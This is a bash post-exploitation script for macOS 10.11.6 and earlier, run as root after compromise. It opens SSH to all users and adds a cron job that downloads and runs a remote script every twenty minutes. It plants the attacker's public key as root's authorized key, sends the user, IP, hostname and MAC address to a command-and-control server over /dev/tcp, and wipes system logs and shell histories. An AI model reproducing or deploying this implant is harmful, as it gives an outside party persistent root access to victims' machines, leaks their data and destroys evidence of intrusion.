#!/usr/bin/env bash
# MUST be run as root. jm.sh should be used to automate exploitation and running of
# this script on Macs running OS X <= 10.11.6.

# /sbin/ifconfig isn't in root's path by default, so let's just do this I guess
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH

# Remote login/SSHD should already be on and enabled for root. But just in case:
# Enable SSH
systemsetup -setremotelogin on >/dev/null
# Open SSH to all users
dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled >/dev/null

# Unlike on Linux, we have to fully save the file rather than just piping it into bash.
# On Macs, each line is executed separately, so things like variables won't work if we just pipe it.
(crontab -l 2>/dev/null; echo '*/20 * * * * curl -Lo /tmp/update.sh boesen.science:2042/mac/update.sh; chmod +x /tmp/update.sh; /tmp/update.sh') | crontab -

SSHPATH="/var/root/.ssh"

mkdir -p "$SSHPATH" # On most computers, there won't be a .ssh directory initially

rm "$SSHPATH/authorized_keys" # Just in case
curl -Lso "$SSHPATH/authorized_keys" boesen.science:2042/pubkey

USER=$(stat -f "%Su" /dev/console) # Get user currently logged in (in GUI).
IP=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
HOSTNAME=$(hostname)
MAC=$(/sbin/ifconfig en1 | awk '/ether/{print $2}')

SERVER="boesen.science"
PORT=2043

# Send data to C&C
exec 3<>/dev/tcp/$SERVER/$PORT
printf "JOIN: $USER $IP $HOSTNAME $MAC" >&3

function timeout() { perl -e 'alarm shift; exec @ARGV' "$@"; }
# Print response, time out if none
timeout 1 cat <&3 && echo

rm -rf /var/log/*
rm -f /var/root/.*history /Users/*/.*history

for i in {1..50}; do
    printf "\n\n\n\n\n\n"
done
